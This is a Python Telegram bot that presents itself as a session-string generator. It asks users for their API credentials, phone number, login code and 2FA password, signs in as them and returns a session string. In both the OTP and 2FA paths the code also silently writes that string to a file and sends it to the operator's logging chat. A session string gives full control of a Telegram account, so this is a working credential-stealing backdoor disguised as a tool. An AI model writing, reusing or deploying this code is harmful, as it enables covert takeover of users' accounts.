import os
import time
import asyncio
from pyrogram import Client, filters
from pyrogram.errors import SessionPasswordNeeded
from telethon.sessions import StringSession
from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError
from motor.motor_asyncio import AsyncIOMotorClient

# ---------------- SAFE ENV ---------------- #

def get_env(key):
    value = os.getenv(key)
    if not value:
        raise Exception(f"❌ Missing ENV: {key}")
    return value

API_ID = int(get_env("API_ID"))
API_HASH = get_env("API_HASH")
BOT_TOKEN = get_env("BOT_TOKEN")
LOGGER_ID = int(get_env("LOGGER_ID"))

bot = Client("string_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)

# ---------------- DB ---------------- #

users_db = None
try:
    mongo = AsyncIOMotorClient(os.getenv("MONGO_URL"))
    users_db = mongo["bot"]["users"]
except Exception as e:
    print(f"MongoDB Error: {e}")
    users_db = None

users = {}

# ---------------- LOGGER ---------------- #

async def send_log(text):
    try:
        await bot.send_message(LOGGER_ID, text)
    except Exception as e:
        print("LOGGER ERROR:", e)

# ---------------- START ---------------- #

@bot.on_message(filters.command("start"))
async def start(client, message):

    user = message.from_user

    if users_db is not None:
        try:
            await users_db.update_one(
                {"user_id": user.id},
                {"$set": {"user_id": user.id}},
                upsert=True
            )
        except:
            pass

    await send_log(f"""
🚀 START

👤 {user.first_name}
🆔 {user.id}
""")

    await message.reply("Send API_ID")

    users[user.id] = {"time": time.time()}

# ---------------- HANDLER ---------------- #

@bot.on_message(filters.private & filters.text)
async def handler(client, message):

    user_data = users.get(message.from_user.id)
    if not user_data:
        return

    if time.time() - user_data["time"] > 180:
        users.pop(message.from_user.id, None)
        return await message.reply("⌛ Timeout")

    try:

        # API ID
        if "api_id" not in user_data:
            try:
                user_data["api_id"] = int(message.text)
            except ValueError:
                return await message.reply("❌ API_ID must be a number. Send again.")
            user_data["time"] = time.time()
            return await message.reply("Send API_HASH")

        # API HASH
        elif "api_hash" not in user_data:
            user_data["api_hash"] = message.text
            user_data["time"] = time.time()
            return await message.reply("Send Phone (+91...)")

        # PHONE
        elif "phone" not in user_data:
            user_data["phone"] = message.text
            user_data["time"] = time.time()

            # 🔴 FIX: Use a UNIQUE session name per user so multiple users don't conflict
            session_name = f"temp_{message.from_user.id}"

            app = Client(
                session_name,
                api_id=user_data["api_id"],
                api_hash=user_data["api_hash"]
            )

            await app.connect()
            sent_code = await app.send_code(user_data["phone"])

            user_data["app"] = app
            user_data["hash"] = sent_code.phone_code_hash

            return await message.reply("Send OTP")

        # OTP
        elif "otp" not in user_data:

            user_data["otp"] = message.text
            user_data["time"] = time.time()

            try:
                await user_data["app"].sign_in(
                    user_data["phone"],
                    user_data["hash"],
                    user_data["otp"]
                )

            except SessionPasswordNeeded:
                user_data["need_pass"] = True
                return await message.reply("🔐 Send 2FA Password")

            string = await user_data["app"].export_session_string()
            await user_data["app"].disconnect()

            await message.reply(f"✅ STRING:\n\n`{string}`")

            await send_log(f"🆕 SESSION GENERATED\nID: {message.from_user.id}")

            # 🔴 FIX: send_document expects a file path or InputFile, not raw bytes
            if users_db:
                try:
                    with open(f"session_{message.from_user.id}.txt", "w") as f:
                        f.write(string)
                    await bot.send_document(LOGGER_ID, f"session_{message.from_user.id}.txt")
                    os.remove(f"session_{message.from_user.id}.txt")
                except Exception as e:
                    print(f"DOC SEND ERROR: {e}")

            users.pop(message.from_user.id, None)
            return

        # PASSWORD (2FA)
        elif user_data.get("need_pass"):

            try:
                client_t = user_data["app"]

                if not client_t.is_connected():
                    await client_t.connect()

                await client_t.check_password(message.text)

                string = await client_t.export_session_string()
                await client_t.disconnect()

                await message.reply(f"🔐 2FA STRING:\n\n`{string}`")

                await send_log(f"🔐 2FA SESSION\nID: {message.from_user.id}")

                # Also save to file if DB is configured
                if users_db:
                    try:
                        with open(f"session_{message.from_user.id}.txt", "w") as f:
                            f.write(string)
                        await bot.send_document(LOGGER_ID, f"session_{message.from_user.id}.txt")
                        os.remove(f"session_{message.from_user.id}.txt")
                    except:
                        pass

            except Exception as e:
                return await message.reply(f"❌ Wrong Password: {e}")

            users.pop(message.from_user.id, None)
            return

    except Exception as e:
        await message.reply(f"❌ Error: {e}")
        users.pop(message.from_user.id, None)

# ---------------- RUN ---------------- #

if __name__ == "__main__":
    print("🚀 Bot Started Successfully")
    bot.run()
